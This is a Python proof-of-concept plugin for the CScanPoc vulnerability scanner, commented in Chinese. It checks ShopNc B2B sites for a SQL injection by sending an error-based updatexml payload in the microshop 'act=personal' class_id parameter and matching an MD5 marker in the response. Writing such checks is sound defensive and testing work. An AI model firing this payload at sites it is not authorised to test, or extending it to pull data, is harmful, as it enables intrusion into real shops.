# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'ShopNc_0005' # 平台漏洞编号，留空
    name = 'ShopNc B2B版SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-03'  # 漏洞公布时间
    desc = '''
        ShopNc B2B版SQL注入漏洞。
        /microshop/index.php?act=
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'ShopNc CMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5a03d3bb-05f7-4419-baa0-d2a5963fd4f4'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #Refer:http://www.wooyun.org/bugs/wooyun-2015-0124172
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = "/microshop/index.php?act=personal&class_id[0]=exp&class_id[1]=1)%20or%20updatexml(1,concat(0x5c,md5(1)),1)%23--"
            url = arg + payload
            code, head, res, errcode,finalurl = hh.http(url)

            if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
                #security_hole('find sql injection: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
